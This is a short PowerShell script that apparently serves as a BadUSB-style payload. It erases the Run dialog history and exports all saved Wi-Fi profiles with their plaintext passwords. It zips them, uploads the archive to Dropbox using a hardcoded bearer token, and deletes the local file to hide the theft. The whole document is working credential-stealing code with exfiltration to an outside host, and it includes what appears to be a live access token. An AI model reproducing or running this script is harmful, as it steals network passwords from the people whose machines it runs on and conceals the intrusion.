$RegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-Item -Path $RegistryPath
mkdir $env:Temp\Netwerk
netsh wlan export profile key=clear folder=$env:Temp\Netwerk
Compress-Archive -Path $env:Temp\Netwerk\* -CompressionLevel NoCompression -DestinationPath $env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip
$TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + "sl.BpcOrMmxWErZuDBimk7J7R1EECvBohf94qd4d5Tf914aYp4PTnV5l7dXGYPGjjz0yC" + "aAqa0TiXZcYotPGmez-fPdddOV6ygOgA1r0IBQN4pUqee7J-7z8wrOwuv9oo5YT5mi30iHDpx_yeNR_TCYhW8"
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
rm $SourceFilePath

